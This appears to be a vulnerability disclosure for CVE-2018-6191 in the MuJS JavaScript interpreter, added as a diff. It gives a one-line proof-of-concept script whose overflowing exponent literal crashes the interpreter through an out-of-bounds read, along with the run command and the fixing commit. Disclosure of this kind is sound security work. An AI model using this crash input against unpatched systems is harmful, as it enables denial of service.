@@ -1,0 +1,36 @@
+Hello,
+
+I want to submit the following bug:
+
+The js_strtod function in jsdtoa.c in Artifex MuJS through 1.0.2 has an
+integer overflow because of incorrect exponent validation.
+
+# Exploit Title: Integer signedness error leading to Out-of-bounds read
+that causes crash
+# Date: 2018-01-24
+# Exploit Author: Andrea Sindoni - @invictus1306
+# Vendor: Artifex (https://www.artifex.com/)
+# Software Link: https://github.com/ccxvii/mujs
+# Version: Mujs - 228719d087aa5e27dcd8627c4acf7273476bdbca
+# Tested on: Linux
+# CVE : CVE-2018-6191
+
+Content of the poc file
+$ cat poc.js
+function pipo() {var 2e2147483648= 117486231123842366;}
+
+Run it
+$ mujs poc.js
+
+Additional details about the bug:
+
+Inside the function js_strtod, after this line
+https://github.com/ccxvii/mujs/blob/81388eb40d29f10599ac30dde90e683a3c254375/jsdtoa.c#L714
+
+exp = -exp;
+
+the value of "exp" is still negative (cause integer declaration).
+
+Fixed in commit 25821e6d74fab5fcc200fe5e818362e03e114428 (
+http://git.ghostscript.com/?p=mujs.git;a=commit;h=25821e6d74fab5fcc200fe5e818362e03e114428
+)
